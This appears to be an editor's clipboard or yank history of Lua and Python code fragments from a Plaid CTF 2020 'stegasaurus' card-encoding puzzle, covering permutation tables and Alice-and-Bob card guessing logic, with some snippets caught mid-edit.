	        io.write(v, " ")
	  end
	  io.write("\n")
	end
	
33f38e5d174abe42caa2ef0d2d96f626|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|84|1|V|lua
	-- perms = permutations({1,2,3,4}, 4)
7d8a710540b9578dbd9a1d67420fca27|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|84|5|V|lua
	    perms
5c037e312e56252b3f79174584cb6abb|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|78|3|V|lua
	perms = {}
	count = 1
	for p in perm{"1", "2", "3"} do
	    num = ""
	    for i = 1, #p do
	        num = num .. p[i]
	    end
	    perms[count] = num
	    count = count + 1
	end
35027413da089af39e136a2a1600a53f|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|73|1|V|lua
	    perms = {}
	    count = 1
	    for p in perm{"1", "2", "3"} do
	        num = ""
	        for i = 1, #p do
	            num = num .. p[i]
	        end
	        perms[count] = num
	        count = count + 1
	    end
753d2f098fa94a0d7b078cefb753f2d1|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|75|1|V|lua
	    for p in perm{"1", "2", "3", "4", "5", "6", "7"} do
44ce1c5594406b03e81c42b3c423ea21|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|88|5|V|lua
	    for p in perm{"1", "2", "3"} do
8b22c0fb0869bcba1b7220be420ade00|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|86|1|V|lua
	    perms = {}
	    count = 1
	    for p in perm{"1", "2", "3", "4", "5", "6", "7"} do
	        num = ""
	        for i = 1, #p do
	            num = num .. p[i]
	        end
	        perms[count] = num
	        count = count + 1
	    end
04b0eb8fc114bec666dc8bd0ff32f61d|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|112|55|v|python
	 '4', '5', '6', '7'
b938e54c5fd012272ca6dde285c052aa|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|112|1|V|python
	    iter_perm = itertools.permutations(['1', '2', '3', '4', '5', '6', '7'])
0125dd0ca0ac038707ebbe0d4d0d4d35|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|119|1|V|python
	    for idx, val in enumerate(val2perm):
	        print(idx, ': ', val)
bf24ff7bd3eccf579e0b9645c35a1146|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|122|31|v|python
	val2perm
c347c86105bcd03c55c495388cc4b2f2|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|122|21|v|python
	enumerate(perm2val)
93e9ee46c096dc2bf916433b90fa83b0|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|100|28|v|lua
	, "4", "5", "6", "7"
58f57b98cc8cfb81907179e9b4635762|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|108|28|v|lua
	perms
3b7ba5f57e063cf5d6a51023b70ff5f9|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|110|1|V|lua
	for index, value in ipairs(val2perm) do
	    print(index, ": ", value)
	end
f42db38c8ac1419490771f7cf887446a|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|98|1|V|lua
	val2perm = {}
	perm2val = {}
	count = 1
	for p in perm{"1", "2", "3"} do
	    num = ""
	    for i = 1, #p do
	        num = num .. p[i]
	    end
	    val2perm[count] = num
	    perm2val[num] = count
	    count = count + 1
	end
66628d3f095422ba30ed6979a886e15f|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|86|1|V|lua
	    perms = {}
	    count = 1
	    for p in perm{"1", "2", "3", "4", "5", "6", "7"} do
	        num = ""
	        for i = 1, #p do
	            num = num .. p[i]
	        end
	        perms[count] = num
	        count = count + 1
	    end
	
2b7f45004958a19fa8ad967ca2ffba1b|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|86|1|V|lua
	    val2perm = {}
	    perm2val = {}
	    count = 1
	    for p in perm{"1", "2", "3"} do
	        num = ""
	        for i = 1, #p do
	            num = num .. p[i]
	        end
	        val2perm[count] = num
	        perm2val[num] = count
	        count = count + 1
	    end
7a39064a81948aa8156fcb1c4651e9a3|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|73|5|V|lua
	    perms = {}
	    count = 1
	        num = ""
	        for i = 1, #p do
	            num = num .. p[i]
	        end
	        perms[count] = num
	        count = count + 1
	    end
	    val2perm = {}
	    perm2val = {}
	    count = 1
732cfcca4ab761364b861dbea31cb124|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|74|5|V|lua
	    count = 1
	        num = ""
	        for i = 1, #p do
	            num = num .. p[i]
	        end
	        perms[count] = num
	        count = count + 1
	    end
56b147e5def40acfce38dfc5c339659d|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|73|5|V|lua
	    perms = {}
08c9cfc4ae2553e7ef7967bce795406d|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|88|1|V|lua
	    val2perm = {}
	    perm2val = {}
	    count = 1
	    for p in perm{"1", "2", "3", "4", "5", "6", "7"} do
	        num = ""
	        for i = 1, #p do
	            num = num .. p[i]
	        end
	        val2perm[count] = num
	        perm2val[num] = count
	        count = count + 1
	    end
0d33e72cad34d27315dc0b4a441fcf54|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|121|5|V|lua
	for idx = 1, 3 do
	    print(vals[idx])
	end
09590ab84b492bb360a44a8fa1a386ef|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|47|5|V|lua
	-- function permutations(arr, n)
	--     if n == 0 then
	--         coroutine.yield(arr)
	--     else
	--         for i = 1 ,n do
	--             -- put i-th element as the last one
	--             arr[n], arr[i] = arr[i], arr[n]
	--             -- generate all permutations of the other elements
	--             permutations(arr, n - 1)
	--             -- restore i-th element
	--             arr[n], arr[i] = arr[i], arr[n]
	--         end
	--         -- return(arr)
	--     end
	-- end
	
	-- function perm(arr)
	--     local n = #arr
	--     local co = coroutine.create(function () permutations(arr, n) end)
	--     return function ()   -- iterator
	--         local code, res = coroutine.resume(co)
	--         return res
	--     end
	-- end
c2c4358dd17feb608d776701069f2261|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|123|12|V|lua
	    local length = #items
	    result = {}
691d502cfd0e0626cd3b058e5682ad1c|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|120|23|v|lua
	items
b2021c4149dfd5dc85c88823b7df34bd|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|172|14|v|lua
	vals
faff06fb3776206077329d4494d07549|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|81|13|V|lua
	            print('test2')
9cb435fce17d3a5566cd7ce51f5d9762|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|88|1|V|lua
	    print(pos)
bf0fed7efdac41e48946b4529822ce01|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|53|13|V|lua
	            print('search')
c2d24a9c75d9af2b2816ddba126b3faf|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|55|13|V|lua
	            print('found')
99c22b7c9b0446d9c9273846dec81d22|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|54|9|V|lua
	        print
40f84a03648380aa9b79f397487b736e|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|55|9|V|lua
	            print(a[i])
21a5df7ae35459070c018d37408782ee|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|68|1|V|lua
	            print('test3')
b3a0c4eba28d9426bf47a22da701ca70|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|82|13|V|lua
	            print('mob')
c1a693662336db68fce3a48c382738ac|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|133|9|V|lua
	        print(a[i])
aa1a72dca462cab5c9e899feee4894e4|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|134|5|V|lua
	    print("\n")
d29af5fc39b85b1909fce25e5633575e|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|88|5|V|lua
	    end
a3964cf08698269fbdb5f8c02ec175a2|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|51|9|V|lua
	    print(n)
	    print(mobile)
	    print("----\n")
a9a8b5fe2298c01491864df6cc030eaf|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|108|9|V|lua
	        -- print(a[i])
8f5304d419229511b61270f26d197e39|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|174|1|V|lua
	-- vals = {"1", "2", "3"}
3365bc59f1c47cc66e6a53be9fa05339|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|172|1|V|lua
	val2perm = {}
	perm2val = {}
3206e96bdcbbe053dd2283ea66b65b15|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|183|1|V|lua
	--     val2perm[count] = num
	--     perm2val[num] = count
	--     count = count + 1
06b88e05befca925f8611246e66abc02|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|133|1|V|lua
	    -- print(num)
d689f4d9b322fe30b54eb873f5b44187|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|130|1|V|lua
	    val2perm[count] = num
	    perm2val[num] = count
	    count = count + 1
f898f5415a77db062cd6b51929e92773|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|157|1|V|lua
	-- function permutations(arr, n)
	--     if n == 0 then
	--         coroutine.yield(arr)
	--     else
	--         for i = 1 ,n do
	--             -- put i-th element as the last one
	--             arr[n], arr[i] = arr[i], arr[n]
	--             -- generate all permutations of the other elements
	--             permutations(arr, n - 1)
	--             -- restore i-th element
	--             arr[n], arr[i] = arr[i], arr[n]
	--         end
	--         -- return(arr)
	--     end
	-- end
	
	-- function perm(arr)
	--     local n = #arr
	--     local co = coroutine.create(function () permutations(arr, n) end)
	--     return function ()   -- iterator
	--         local code, res = coroutine.resume(co)
	--         return res
	--     end
	-- end
	-- count = 1
	-- for p in perm{"1", "2", "3"} do
	--     num = ""
	--     for i = 1, #p do
	--         num = num .. p[i]
	--     end
	--     val2perm[count] = num
	--     perm2val[num] = count
	--     count = count + 1
	-- end
a4c92216bcab83a5b39e00ed64d9be6d|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|152|1|V|lua
	val2perm = {}
	perm2val = {}
	count = 1
	permutations(3)
e578bf5c634f31699e10415edc7be976|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|164|1|V|lua
	-- for index, value in ipairs(val2perm) do
	--     print(index, ": ", value)
	-- end
	-- for index, value in pairs(perm2val) do
	--     print(index, ": ", value)
	-- end
9a2402be2e398c1a4ddf7cd60942f73a|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|158|1|V|lua
	    for index, value in ipairs(val2perm) do
	        print(index, ": ", value)
	    end
	    for index, value in pairs(perm2val) do
	        print(index, ": ", value)
	    end
83e701daaf378fba6e6479779d68ee63|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|160|1|V|lua
	Bob1()
74e474f17e96077e7f4734924d62298e|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|154|1|V|lua
	    val2perm = {}
	    perm2val = {}
	    count = 1
	    permutations(3)
1931b6e18c1f9a806a1c205ae6f6d0fb|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|13|1|V|python
	min_diffs = []
e2ce16d15fe87c193fda1542daec6bb9|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|13|1|V|python
	# logging.basicConfig(level=logging.INFO)
1fa221de58554dea642ffbb34c792e6c|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|5|1|V|python
	import matplotlib.pyplot as plt
1191333662fddcf63deb3b12b88d0f7d|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|4|1|V|python
	import logging
82d75dfdd9f936d2a230e74d128f5e91|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|19|1|V|python
	    global min_diffs
f25fdf2808ff5543225d5579b5ef1f26|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|19|5|V|python
	    # logging.info(f'AVG_ALL: {s//len(hand)}')
ca620fc5d21b0335db6ad62cf46655c5|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|19|5|V|python
	    avg = tot/hand_size
	    logging.info(f'[Alice] AVG {avg}')
f5dfbe060d834cfcf329085de1017201|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|19|5|V|python
	    tot = 0
	    for i in hand:
	        tot += i
	    # avg = int(round(tot/hand_size))
135f9041210d1dbe1dc886a600fc3975|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|19|5|V|python
	    logging.info(f'[Alice] AVG {avg}')
e6caa9acb35dc4480c3d6c832caa90e1|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|20|5|V|python
	    logging.info(f'[Alice] REMAINING HAND: {hand}')
af1f64fad1bb79b7429cf9842ac34c19|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|21|5|V|python
	    logging.info(f'[Alice] CHOICE: {choice}')
20b06369335d1111f0c3cb41d493c5cb|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|12|1|V|python
	    # return [37815, 38918, 13181, 13552, 9227, 33113, 11276, 27166] # sign problem, > vs >=
	    # return [33510, 25236, 4841, 11647, 6391, 25657, 9014, 30251]
8549c1ac1a58d0451e716cdaf08606d1|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|17|5|V|python
	    choice = sorted(hand)[len(hand)//2]
	    hand.remove(choice)
a37ea4ef9c9b2188593f4bb4835cc644|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|22|1|V|python
	    tot2 = 0
	    for i in hand:
	        tot2 += i
	    # new_avg = int(round(tot2/hand_size))
	    new_avg = tot2/hand_size
	    # print('New avg:', new_avg)
	
	    logging.info(f'[Alice] NEW_AVG {new_avg}')
	
	    diff_of_avgs = int(avg - new_avg)
	    bob_sum = (new_avg + diff_of_avgs) * 8
	    print('Real original sum:', tot)
	    print('Bobs sum', bob_sum)
	    if bob_sum < tot:
	        diff_of_avgs += 1
	        bob_sum = (new_avg + diff_of_avgs) * 8
	        print('New bobs sum', bob_sum)
	    # print('His guess:', (new_avg+diff_of_avgs))
	    his_guess = int((new_avg+diff_of_avgs)*8 - tot2)
	    min_diffs.append(diff_of_avgs)
	    logging.info(f'[Alice] DIFF_OF_AVGS {diff_of_avgs}')
	
	    # if diff_of_avgs > len(val2perm)//2:
	    if diff_of_avgs > len(val2perm):
	        logging.error(f'EFAMETIN')
	        raise Exception('shese mestin tianisi')
	
5f4a375bb7602f75484f34c60114f031|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|22|1|V|python
	    # diff_perm = str(val2perm[diff_val])
370bef41b497333c27f6d4d7a83d3f8a|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|67|5|V|python
	    iter_perm = itertools.permutations(['1', '2', '3'])
2e7e7d57815033fd877d02e6763d9a3b|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|72|4|V|python
	    for idx, val in val2perm.items():
	        print(idx, ': ', val)
	
	    for idx, val in perm2val.items():
	        print(idx, ': ', val)
534a96a304a9c686d58ed9abdf7da969|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|78|1|V|python
	    #     hand = get_hand()
a8c70f6fbca5904f6e7bb014a486754c|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|23|9|V|python
	        print(comb)
7179865c3719d96eb9372fdfcd242043|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|24|9|V|python
	        print(chosen)
a6356edd2534b360d2db349a2c2ce415|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|19|5|V|python
	    eliminated = [False] * (math.factorial(8) + 7)
fa40c3daae17826e5994da85fc3d663d|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|21|28|v|python
	(math.factorial(8) + 7)
b0d173bd1e33a42ef6278a17e0fed1e7|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|28|1|V|python
	            if eliminated[card] = False:
	                eliminated[card] = True
5dd2199ad68327cc76d583b057aee7d5|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|34|35|v|python
	card
a6137c0b50b55c06069a941a6439bcdd|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|27|13|V|python
	            counter = math.factorial(7)
ca071943e5acd1c8bcfbe0d2ee36fec2|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|38|20|v|python
	chosen
24a411e05b6d2087357796ce2223f483|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|49|21|V|python
	                    not_eliminated += 1
d9263e2412650487a2dd80d75232b0c1|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|50|21|V|python
	                    print(idx)
fa1b7cb298ab2d6d0f4dafd93ee27014|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|51|13|V|python
	            print(not_eliminated)
093db0c5aa328eb9b8c365fec1877d8c|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|27|13|V|python
	            print(card)
ff791e70f54cc68ed961f87c8faadbdf|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|41|13|V|python
	            print elim_str
8311c5b8fd9f8b48cded6b8d16ef2a49|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|39|18|V|python
	            elim_str = ""
	            for elim in eliminated:
	                elim_str = elim_str + str(elim) + " "
	            print(elim_str)
26eaf5c4ec7d2fd902ee7ea3f9cc37c9|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|54|17|V|python
	                print(elim)
045acd64816f56680893b9be5cff1684|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|56|1|V|python
	        print(not_eliminated)
9c5fcd84dda55a0ebca459aeddd750d5|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|41|9|V|python
	            print(counter)
a3c4eaeb8ac43c514ae1e0ffe6e0148f|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|47|29|V|python
	            for elim in eliminated:
	                elim_str = elim_str + str(elim) + " "
	            # print(elim_str)
c1663ab86fb804976663f59f577bee00|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|16|1|V|python
	
	def choose_and_discard(hand):
	
	    total_cards = math.factorial(hand_size) + (hand_size - 1)
	    final_choice = 0
	    for comb in itertools.combinations(hand, hand_size - 1):
	        print(comb)
	        eliminated = [False] * total_cards
	        for card in hand:
	            if card not in comb:
	                chosen = card
	        for card in comb:
	            if eliminated[card] == False:
	                eliminated[card] = True
	            else:
	                temp_card = (card + 1) % total_cards
	                elim = False
	                while not elim:
	                    if eliminated[temp_card] == False:
	                        eliminated[temp_card] = True
	                        elim = True
	                    temp_card = (temp_card + 1) % total_cards
	
	            pos = (card + 1) % total_cards
	            counter = math.factorial(hand_size - 1)
	            while counter > 0:
	                if eliminated[pos] == False:
	                    eliminated[pos] = True
	                    counter = counter - 1
	                pos = (pos + 1) % total_cards
	            elim_str = ""
	
	        for elim in eliminated:
	            elim_str = elim_str + str(elim) + " "
	        # print(elim_str)
	        not_eliminated = 0
	        for elim in eliminated:
	            if elim == False:
	                not_eliminated += 1
	        print(not_eliminated)
	        if eliminated[chosen] == False:
	            final_choice = chosen
	            print(final_choice)
c353a9609f0cfc93bcaac4bd0e5a36ec|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|19|5|V|python
	    total_cards = math.factorial(hand_size) + (hand_size - 1)
f1e4840c35abf5a823db4c4515480154|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|6|1|V|python
	deck_size = 124
58d1e0f3f514b46fd24d16d78f9d784e|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|13|30|v|python
	deck_size
2c6787d31e935755d13581c94a57d716|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|6|1|V|python
	total_cards = math.factorial(hand_size) + (hand_size - 1)
6c90f83a53495e6b832ee89055805fc3|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|47|1|V|python
	        not_eliminated = 0
	        for elim in eliminated:
	            if elim == False:
	                not_eliminated += 1
	        print(not_eliminated)
835bceb80c90b0a27e15e77f70c86feb|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|45|1|V|python
	
	        # for elim in eliminated:
0a8967ca4b8904657aef678a749d7b4c|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|44|1|V|python
	            elim_str = ""
df0e0ea06fed5fa61d13c2f115f48d69|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|56|25|V|python
	                        print(idx)
cf79850aee75953bbd032e87c1536772|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|59|13|V|python
	            # print(not_eliminated)
3f724dd9d9709769a01373ee8062f501|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|61|1|V|python
	    # diff_perm = str(val2perm[diff_of_avgs])
3341c871fc331b1c2ee8fbb4d0109dae|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|61|5|V|python
	    # sorted_hand = sorted(hand)
fa71d61e23a044077c8276ec1ae4227d|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|61|5|V|python
	    # sort_map = {}
d81ef278aed6096426ba8fa41496cdaa|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|61|5|V|python
	    # for idx, card in enumerate(sorted_hand):
7103cba572f00ffd7a4f895ae4bbb88f|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|61|5|V|python
	    #     sort_map[idx + 1] = card
b0c54de473ef3ecc1258f733224757c6|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|61|5|V|python
	    # new_hand = []
336a9b4ea374b3bc5656c0e4aae511ad|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|61|5|V|python
	    # for c in diff_perm:
6209bd9ca4679e749955c7accd121f54|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|61|5|V|python
	    #     i = int(c)
47f580772c5a2dda175ca19321c5543c|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|61|5|V|python
	    #     new_hand.append(sort_map[i])
ad94958ad5ba27a02f747e180f469c39|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|61|5|V|python
	    # logging.info(f'[Alice] ENCODED HAND: {new_hand}')
55bf778576c5c2942701977c508e70e1|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|64|5|V|python
	    print(sorted_comb)
9038243554802f4d28d769a6b44e7ce5|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|64|25|v|python
	 * (hand_size - 1)
97c731d04286bc687b5239de2b8fb0a4|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|65|29|v|python
	.split('')
d6947ed759ce686c5fa65d68f4748cfe|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|66|9|V|python
	        print(int(pos)-1)
7be874f6aab752c19bda85ac148f0927|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|69|1|V|python
	    # sort_map = {}
	    # for idx, card in enumerate(sorted_hand):
	    #     sort_map[idx + 1] = card
	
	    # new_hand = []
	    # for c in diff_perm:
	    #     i = int(c)
	    #     new_hand.append(sort_map[i])
	
	    # logging.info(f'[Alice] ENCODED HAND: {new_hand}')
	
16151125d24bfc725c4375a6c251d26d|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|69|5|V|python
	    # return choice, new_hand
7aa10a03c0dc1b4de767b24202b9f4b4|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|69|5|V|python
	    print(cards_to_return)
cc46c64e4982b7c7e7debf70f711da71|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|86|1|V|python
	
	    new_avg = avg + perm_val
	    new_tot = new_avg * 8
	    guess = int(new_tot - missing_tot)
dd0b51c83dec3b0fadb1bc8b13745293|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|71|1|V|python
	    missing_tot = 0
	    for i in hand:
	        missing_tot += i
	    avg = missing_tot/hand_size
6c2faf98686b6816bd648fed39433c9a|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|74|5|V|python
	    print(hand)
2e7c8c4ca6c9727997f4845b462fbe8f|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|75|9|V|python
	        print(hand.index(card))
0ff00feb7d22aa0f738bc8360e4979e3|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|78|9|V|python
	        print(card)
a8373353b6d99e2e211a782b5ff96dfc|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|26|1|V|python
	        for card in comb:
	            if eliminated[card] == False:
	                eliminated[card] = True
	            else:
	                temp_card = (card + 1) % total_cards
	                elim = False
	                while not elim:
	                    if eliminated[temp_card] == False:
	                        eliminated[temp_card] = True
	                        elim = True
	                    temp_card = (temp_card + 1) % total_cards
	
	            pos = (card + 1) % total_cards
	            counter = math.factorial(hand_size - 1)
	            while counter > 0:
	                if eliminated[pos] == False:
	                    eliminated[pos] = True
	                    counter = counter - 1
	                pos = (pos + 1) % total_cards
6bf8ec3d94e64a5690bb9246ce11cb0e|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|83|9|V|python
	        for card in comb:
80df4e9bd4104ebed17a7b4da2401f2e|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|82|5|V|python
	    for card in hand:
40a1269384fda0e2827b751a7d34cec0|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|83|17|v|python
	comb
4c8a3054946d339b95a4bbd355482c70|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|46|1|V|python
	        # elim_str = ""
	        # for elim in eliminated:
	        #     elim_str = elim_str + str(elim) + " "
	        # print(elim_str)
fcf70c874df7f25d1de0c0275c70ab69|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|81|25|v|python
	enccoding
138943fe25070a1700edddd339a14130|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|82|5|V|python
	    print(real_pos)
3257ed5d904b4c08a7ee9834d4264aff|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|106|1|V|python
	    # sort_map = {}
	    # for idx, card in enumerate(sorted_hand):
	    #     sort_map[card] = idx + 1
	
	    # perm = ''
	    # for c in hand:
	    #     perm += str(sort_map[c])
	    # perm = int(perm)
	    # perm_val = perm2val[perm]
	
ee561ae48633d95a569a900ce2134c9e|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|111|13|V|python
	            eliminated = True
cab48888bed4224da8e0c4f55ba286b6|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|110|17|V|python
	                print(guess)
178849afcdc576dde41db401c60f6f5c|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|76|5|V|python
	    # print(sorted_hand)
ad90b2dc80a4a77f6cd43dbc4a92930b|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|125|5|V|python
	    # total_iterations = 50000
	    # total_iterations = 1
	    # correct = 0
	    # exceptions = 0
	    # for i in range(total_iterations):
	    #     hand = get_hand()
	    #     try:
	    #         choice, discarded = choose_and_discard(hand)
	    #     except:
	    #         exceptions += 1
	    #         continue
	    #     guess = do_guess(discarded)
	    #     print('Choice:', choice)
	    #     print('Guess:', guess)
	    #     logging.info('=======')
	    #     if guess == choice:
	    #         correct += 1
	    #     # if abs(guess - choice) <= 4:
	    #     #     logging.info('CORRECT')
	    #     #     correct += 1
	    #     # else:
	    #     #     logging.info('WRONG')
	    #     # logging.info('=======')
	
	    # print(f'Correct {correct}/{total_iterations}')
	    # print(f'Exceptions {exceptions}/{total_iterations}')
	
	    # print(f'AVG MIN_DIFF: {mean(min_diffs)}')
	
	    # # plt.hist(min_diffs, bins=1000)
	    # # plt.show()
63878bd9a495a3fb3512e9cc410c1ee5|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|111|5|V|python
	    print("Bob's guess:", guess)
030a465082d28c6bb7e1602be9ce5f44|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|3|1|V|python
	import random
6f5f411d00036651fa082dd496db9cd5|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|1|1|V|python
	from statistics import mean, median
92445e63a78f9dfa9f3a8d6080141f85|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|19|5|V|python
	    prin
085f69c4c8cf75b758a2626d60393b40|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|164|1|V|lua
	test = 
c267527c0f8bbac959323034fc6d8c34|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|171|17|v|lua
	{[1] = 1, [2] = 1, [3] = 2, [4] = 2, [5] = 1, [6] = 1, [7] = 2, [8] = 1, [9] = 1, [10] = 2, [11] = 1, [12] = 1}
5262618d404fa581d624d6acac44b2f6|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|19|1|V|lua
	            table.insert(positions, pos) 
365a4a972db646c76d115b3897f2d4de|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|151|30|v|lua
	positions
9f90d89c09aca1a5a8cdd903e9268451|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|156|13|V|lua
	            print(temp[k])
5f3f201e53281d4870f226f30e5496cc|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|158|9|V|lua
	        print(tmp_str)
8f6fb6b47164871023993bef3d6d59e9|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|181|5|V|lua
	    comb = combs[i] 
668e2736703abac90dd66bd8357d5591|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|181|5|V|lua
	    for j = 1, #comb do
